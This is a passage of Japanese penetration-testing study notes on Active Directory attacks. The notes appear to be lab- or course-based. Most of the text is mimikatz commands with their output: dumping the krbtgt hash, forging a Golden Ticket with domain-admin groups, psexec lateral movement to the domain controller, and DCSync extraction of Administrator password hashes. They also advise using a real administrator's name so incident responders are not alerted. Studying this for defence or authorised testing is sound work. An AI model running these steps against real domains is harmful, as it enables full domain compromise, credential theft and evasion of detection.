### Golden Tickets

ユーザーがTGTのリクエストを送信するとき、 KDCはドメイン内のKDCだけが知っている秘密鍵でTGTを暗号化する

この秘密鍵は、実際には`krbtgt`.1というドメインユーザーアカウントのパスワー ドハッシュである

* DCでkrbtgtの認証情報をダンプする

  ```cmd
  privilege::debug
  lsadump::lsa /patch
  
  ---
  Domain : corp / S-1-5-21-4038953314-3014849035-1274281563
  ・・・・
  RID  : 000001f6 (502)
  User : krbtgt
  LM   :
  NTLM : fc274a94b36874d2560a7bd332604fab
  ```

* workstationでゴールデンチケットを作成する（管理者権限不要）

  ```cmd
  kerberos::purge
  kerberos::golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-4038953314-3014849035-1274281563 /krbtgt:fc274a94b36874d2560a7bd332604fab /ptt
  ```

  * SIDはドメインのSIDを指定
  * ユーザー名は任意

  存在しないユーザー名を使用すると、インシデントハンドラがアクセスログを確認する際に警告を発する可能性がある。既存のシステム管理者の名前とIDを使用することを検討

  ```cmd
  User      : fakeuser
  Domain    : corp.com (CORP)
  SID       : S-1-5-21-4038953314-3014849035-1274281563
  User Id   : 500
  Groups Id : *513 512 520 518 519
  ServiceKey: fc274a94b36874d2560a7bd332604fab - rc4_hmac_nt
  Lifetime  : 1/13/2023 4:22:09 PM ; 1/10/2033 4:22:09 PM ; 1/10/2033 4:22:09 PM
  -> Ticket : ** Pass The Ticket **
  
   * PAC generated
   * PAC signed
   * EncTicketPart generated
   * EncTicketPart encrypted
   * KrbCred generated
  
  Golden ticket for 'fakeuser @ corp.com' successfully submitted for current session
  ```

  ユーザーIDはデフォルトで500に設定されており、ドメインのビルトイン管理者のRID。

  グループIDの値は、ドメイン管理者グループを含む、Active Directoryの最も特権的なグループから構成されている

* misc::cmdで新しいコマンドプロンプトを起動

  ```
  misc::cmd
  
  ----
  mimikatz # misc::cmd
  Patch OK for 'cmd.exe' from 'DisableCMD' to 'KiwiAndCMD' @ 00007FF72DEC95E0
  ```

  →新しいコマンドプロンプトが立ち上がる

* 横展開する

  ```
  psexec.exe \\dc01 cmd.exe
  ```

  ※ドメインコントローラの IP アドレスに接続すると、代わりに NTLM 認証の使用を強制されアクセスできないため注意




### Domain Controller Synchronization

ドメイン内のすべての管理ユーザーのパスワードハッシュを盗む

本番環境では、ドメインは通常、冗長性を確保するために複数のドメインコントローラーを持つ

Replication Service Remote Protocol2 は、これらの冗長ドメインコントローラーを同期させるために、レプリケーション3 を使用する

* DomainAdminsの権限を持つユーザでworkstationに接続しリモートでDCに認証情報要求を行う

```
lsadump::dcsync /user:Administrator

----
mimikatz # lsadump::dcsync /user:Administrator
[DC] 'corp.com' will be the domain
[DC] 'DC01.corp.com' will be the DC server
[DC] 'Administrator' will be the user account

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : Administrator
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 2/5/2020 2:52:18 PM
Object Security ID   : S-1-5-21-4038953314-3014849035-1274281563-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: 2892d26cdf84d7a70e2eb3b9f05c425e
    ntlm- 0: 2892d26cdf84d7a70e2eb3b9f05c425e
    ntlm- 1: e2b475c11da2a0748290d87aa966c327
    lm  - 0: 10278caec71cb826cf1f7fb66b1db394

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 77e41762fdeeba7397ed7de067db9898

* Primary:Kerberos-Newer-Keys *
    Default Salt : CORP.COMAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 00d4b643098e57bb9cc595dd841dbc06ad3c0f9ca8b3e79411f2281189f6a75f
      aes128_hmac       (4096) : f4dba803925bc55a209b73f31a25038f
      des_cbc_md5       (4096) : c18c4c0e898fad10

* Primary:Kerberos *
    Default Salt : CORP.COMAdministrator
    Credentials
      des_cbc_md5       : c18c4c0e898fad10

* Packages *
    NTLM-Strong-NTOWF

* Primary:WDigest *
    01  4d2c6490dc8fcbbbde2d7776d7350e20
    02  ce49447866092118cd64e2e59bbb6fa9
    03  fc305e248608a0c9078c5e6d41dd0ffa
    04  4d2c6490dc8fcbbbde2d7776d7350e20
    05  a4f514f32121594731029e5054de9790
    06  8cb07b3d2109fda2aad7d4ee1ed34a90
    07  844e1e97ced9b7cbaf55e2e8a80e991e
    08  4dac9c56bd48bf351fabf9bb5478350a
    09  dc9f5ff4037bdebe12b111f69fb44552
    10  5ef1c4be0eb2b39744b836620704e5ee
    11  91a018785e77c1111cb446dd970f33ef
    12  4dac9c56bd48bf351fabf9bb5478350a
    13  9b66f1b0d81ba42eb0f370b4f13c6333
    14  b35c42dfafc13b676cdb120e0ef9b396
    15  fa2de75f3ab56f566154d84b5119cf8a
    16  4511aea07897fc3c573235c11abd885b
    17  c9e681f424024cda7b41df9e910a949a
    18  53be72294715f429eec062b17862745f
    19  ffe64495c6ef5f57ea288ec79e666859
    20  71c730c6b62b7d04564f74f4e69770c2
    21  ed456d4a98632e2e9b25148acf0f4503
    22  645fb02c92483bef47ddf6a8b8c00f7c
    23  4db1e6c8f4117f0e830bb61a013ce2cc
    24  a114d5d35435e8d9b84e1cec32097751
    25  09b9d6104028176c2e76bd6c69d59ab0
    26  1745423a33c7bcb6ebc851cc1ac1ebfa
    27  6d15282ea9f5e445e083f10423d0de87
    28  e9720ced80fd81f4965d8e5060f0c3ae
    29  52a84bf0fa72c9bc3f2a7b939750f5b1
```

過去29回分のユーザーパスワードに関連する複数のハッシュと、AES暗号化で使用されるハッシュが含まれている



